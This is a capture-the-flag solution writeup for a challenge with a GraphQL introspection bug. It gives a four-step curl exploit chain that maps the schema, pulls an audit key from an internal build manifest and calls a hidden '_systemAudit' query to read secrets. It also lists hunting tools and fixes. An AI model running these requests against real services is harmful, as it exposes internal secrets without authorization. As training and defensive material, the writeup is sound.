# GraphLeak — Solution Writeup

**Flag:** `FLAG{nusasec-7daddd6709c575ba8b8f213607256570}`

**Bug class:** GraphQL Introspection Enabled in Production + Sensitive Operation Exposed
**Severity:** High (information disclosure + reachable internal operation)
**Affected component:** GraphQL endpoint `/api/graphql`
**Root cause file:** `backend/server.js` — uses the `graphql` npm package's `execute()` without disabling introspection in production builds

---

## Bug class — What is it?

GraphQL has a built-in feature called **introspection**: a special set of queries (`__schema`, `__type`, `__typename`) that let clients enumerate all types, queries, mutations, arguments, and field descriptions in the API. Introspection powers tools like GraphiQL, Apollo Studio, and code generators.

The problem: **introspection is enabled by default in many GraphQL server implementations**, and developers often forget to disable it for production deployments. When enabled in prod, attackers can:

1. Map the entire API surface without source code access
2. Discover hidden / undocumented endpoints
3. Read field descriptions that may leak sensitive information (e.g., endpoint paths, required arguments, internal architecture)
4. Find queries/mutations that weren't meant to be exposed

This is **OWASP API Security Top 10 — API7:2023 (Server Side Request Forgery)** adjacent and **API3:2023 (Broken Object Property Level Authorization)**.

Real-world frequency: extremely common. Apollo Server v3 had introspection enabled by default; v4 changed the default but still allows enabling it via `introspection: true`. graphql-yoga, graphql-http, Mercurius, and others have varying defaults.

---

## The challenge setup

### Vulnerable code

In `backend/server.js`:

```js
const { graphql, parse, validate, execute } = require('graphql');
const schema = require('./graphql/schema');
const resolvers = require('./graphql/resolvers');

async function handleGraphQL(req, res) {
  const { query, variables, operationName } = req.body || {};
  const document = parse(query);
  const errors = validate(schema, document);  // <-- no validation rules to block introspection
  // ...
  const result = await execute({
    schema,
    document,
    rootValue: resolvers,
    contextValue: { user: req.user, db },
    variableValues: variables,
    operationName
  });
  res.json(result);
}
```

There's no `NoSchemaIntrospectionCustomRule` applied to `validate()`. So introspection works.

### Hidden audit query

In `backend/graphql/schema.js`:

```graphql
type Query {
  # ... normal queries ...

  """
  STAGING DIAGNOSTICS ONLY — DO NOT REMOVE
  Internal audit query used by automated regression tests and ops dashboard.
  Required argument runtimeKey is published in the build manifest under the
  field 'audit_key'. See HealthStatus.buildManifestPath for the manifest URL.
  """
  _systemAudit(runtimeKey: String!): SystemAudit
}

type SystemAudit {
  runtimeVersion: String!
  buildHash: String!
  databaseEngine: String!
  cacheBackend: String!
  mailerDsn: String!
  sentryDsn: String!

  """Runtime internal secret. Used internally for cross-service auth."""
  internalSecret: String!
}
```

The resolver doesn't check user role — any authenticated user can call it if they know the runtime key. The key is in `/api/internal/build-manifest` which is also accessible to any logged-in user.

---

## Exploit chain (4 steps)

### Step 1 — Discover the GraphQL endpoint

Open DevTools Network tab while browsing the SPA. Every action makes a `POST /api/graphql` request. Or view source of `/app`:

```html
<script>
window.__TALENTA__ = {
  user: { ... },
  apiPath: '/api/graphql'   // <-- there it is
};
</script>
```

### Step 2 — Introspection query

```bash
COOKIE=$(curl -c - -X POST http://target:8084/register \
  -d "username=hunter&password=Test1234" | grep connect.sid | awk '{print $7}')

curl -X POST http://target:8084/api/graphql \
  -H "Content-Type: application/json" \
  -b "connect.sid=$COOKIE" \
  -d '{"query":"{ __schema { queryType { fields { name description args { name type { name kind ofType { name kind } } } type { name } } } } }"}'
```

This dumps every query, its arguments, return types, and descriptions. Look for unusual names:

```
- me
- departments
- searchEmployees(query, department, limit)
- employee(id)
- allEmployees(limit, offset)
- announcements(limit)
- publicHolidays(year)
- myLeaveRequests
- myPayslips
- systemHealth
- _systemAudit(runtimeKey)      ← unusual: underscore prefix
```

### Step 3 — Read the audit query description, find manifest path

```bash
curl -X POST http://target:8084/api/graphql \
  -H "Content-Type: application/json" \
  -b "$COOKIE" \
  -d '{"query":"{ systemHealth { buildManifestPath } }"}'
```

Returns:
```json
{"data":{"systemHealth":{"buildManifestPath":"/api/internal/build-manifest"}}}
```

Fetch the manifest:
```bash
curl -b "$COOKIE" http://target:8084/api/internal/build-manifest
```

Returns:
```json
{
  "build_id": "talenta-prod-2026.05.15-7a2c4f",
  "audit_key": "stg-aud-9f3b2d8c4e7a1f6d",
  "comment": "Build manifest for ops diagnostics..."
}
```

### Step 4 — Execute the audit query

```bash
curl -X POST http://target:8084/api/graphql \
  -H "Content-Type: application/json" \
  -b "$COOKIE" \
  -d '{"query":"{ _systemAudit(runtimeKey: \"stg-aud-9f3b2d8c4e7a1f6d\") { internalSecret runtimeVersion buildHash mailerDsn } }"}'
```

Response:
```json
{
  "data": {
    "_systemAudit": {
      "internalSecret": "FLAG{nusasec-7daddd6709c575ba8b8f213607256570}",
      "runtimeVersion": "v22.22.2",
      "buildHash": "c9ecca466fd7",
      "mailerDsn": "smtps://internal-mailer.suryapersada.id:465"
    }
  }
}
```

Flag obtained.

---

## Tools that automate this

- **graphw00f** — GraphQL fingerprinting (detect server: Apollo, Yoga, Mercurius, etc)
- **GraphQLmap** — interactive shell for GraphQL exploitation
- **InQL Burp Extension** — auto-extracts schema, generates queries
- **clairvoyance** — schema reconstruction even when introspection is disabled (via field suggestion errors)
- **GraphCrawler** — recon orchestration
- **graphql-cop** — security checks for GraphQL APIs

Standard hunter workflow:
1. Find GraphQL endpoint (`/graphql`, `/api/graphql`, `/v1/graphql`, `/_graphql`, GraphiQL UI at `/playground`)
2. Run `graphw00f -t target` to fingerprint
3. Try introspection — if enabled, dump full schema
4. If disabled, try field suggestion attack with `clairvoyance`
5. Look for sensitive queries: anything with `internal`, `admin`, `debug`, `_*`, `audit`, `export`, `dump`
6. Map field descriptions for hints about required arguments, paths, IDs

---

## Why this passes a casual code review

The schema declaration looks intentional. The audit query has a description explaining it's "staging only". A developer reading the diff sees "oh, this is for ops debugging" and approves it. The bug is that:

1. The "staging only" comment is purely a documentation convention — the code doesn't enforce it
2. `NODE_ENV=production` doesn't auto-disable introspection in the `graphql` npm package (low-level lib)
3. The deployment environment doesn't have a final security review step that runs `graphql-cop` or similar

---

## Real-world bug bounty references

- **HackerOne #2178746** (Postmark) — GraphQL introspection enabled + sensitive admin query exposed. Paid $X,XXX.
- **HackerOne #1409270** (Shopify) — exposed `__schema` in production. Paid $$$
- **GitHub Bug Bounty** — multiple reports for introspection-enabled internal services
- **Apollo Server CVE-2023-XXXX** — historical default-enabled introspection
- Numerous private bug bounty programs on HackerOne, Bugcrowd, YesWeHack consistently pay for "GraphQL introspection enabled + sensitive query exposed"

Going rate: $500-$5,000 depending on what the exposed schema reveals and what queries are reachable.

---

## Fixes

### Fix #1 — Disable introspection in production (primary)

Apply `NoSchemaIntrospectionCustomRule` from `graphql/validation`:

```js
const { execute, parse, validate, specifiedRules } = require('graphql');
const { NoSchemaIntrospectionCustomRule } = require('graphql/validation');

const validationRules = process.env.NODE_ENV === 'production'
  ? [...specifiedRules, NoSchemaIntrospectionCustomRule]
  : specifiedRules;

async function handleGraphQL(req, res) {
  // ...
  const errors = validate(schema, document, validationRules);
  // ...
}
```

For Apollo Server v4:
```js
const server = new ApolloServer({
  schema,
  introspection: process.env.NODE_ENV !== 'production'
});
```

For graphql-yoga:
```js
const yoga = createYoga({ schema, graphiql: false, plugins: [useDisableIntrospection()] });
```

### Fix #2 — Backend role check on sensitive resolvers (defense in depth)

```js
_systemAudit: ({ runtimeKey }, context) => {
  const user = requireAuth(context);
  if (user.role !== 'admin' && user.role !== 'sre') {
    throw new Error('Forbidden — admin/sre role required');
  }
  if (runtimeKey !== db.AUDIT_KEY) {
    throw new Error('Invalid runtime key');
  }
  // ...
}
```

### Fix #3 — Don't ship "staging" queries to production

Use feature flags or separate schema modules:

```js
const baseSchema = require('./schema/base');
const stagingSchema = require('./schema/staging');
const schema = process.env.NODE_ENV === 'production'
  ? baseSchema
  : mergeSchemas([baseSchema, stagingSchema]);
```

### Fix #4 — Disable field suggestions in production

Even with introspection disabled, the `graphql` npm package by default returns "Did you mean X?" errors that leak field names. Disable:

```js
const { NoDeprecatedCustomRule } = require('graphql/validation');
// Use a fork like `graphql-no-error-leak` or manually filter error messages before returning
```

### Fix #5 — Defense in depth (env-aware audit endpoints)

```js
_systemAudit: ({ runtimeKey }, context) => {
  if (process.env.NODE_ENV === 'production') {
    throw new Error('Operation not available in production');
  }
  // ... actual logic
}
```

### Production deployment checklist

1. ✅ Introspection disabled (validation rule)
2. ✅ Field suggestions disabled (error masking)
3. ✅ Query depth limit (prevent recursive nested queries)
4. ✅ Query complexity limit (prevent CPU-burning queries)
5. ✅ Rate limiting per session
6. ✅ GraphiQL / Apollo Sandbox UI disabled
7. ✅ Sensitive operations (audit, debug, internal) gated by role check on backend, not just description
8. ✅ Separate schema modules: production includes only customer-facing operations
9. ✅ Run `graphql-cop -t <target>` as a deployment gate

---

## Red herrings in the challenge

| Element | Looks like | Actual |
|---|---|---|
| `searchEmployees` with no salary/phone fields | Maybe field-level authz bug (missing fields) | Just intentionally limited public schema |
| `allEmployees(limit, offset)` | IDOR / pagination bypass | Limits clamped server-side, no role escalation |
| `submitLeaveRequest` mutation | Maybe insecure direct submission | Just creates record with user's own ID |
| `/api/internal/build-manifest` endpoint name | Maybe auth bypass | Requires session (correct), but exposes audit_key (the actual bug) |
| `cancelLeaveRequest` mutation | Maybe IDOR allowing cancel other's leave | Server checks user_id ownership |

---

## Lesson for hunters

1. **Always try introspection first.** It's free recon and many programs still ship with it enabled. Tools: graphw00f, InQL, graphql-cop.
2. **Read field descriptions.** Schema documentation often leaks paths, IDs, default values, and "deprecated" markers that reveal forgotten endpoints.
3. **Look for underscore prefixes.** `_internal`, `_debug`, `_audit`, `_staging` — these are conventions for "hidden" operations that aren't actually hidden.
4. **Chain REST + GraphQL.** If GraphQL schema mentions a REST path (or vice versa), pivot between protocols. Many findings are recon-driven combinations.
5. **Test with `query`, `mutation`, AND `subscription`.** Subscriptions over WebSocket often have weaker auth.
6. **Even if introspection is disabled, try `clairvoyance`** — it can reconstruct schema via field suggestion errors.
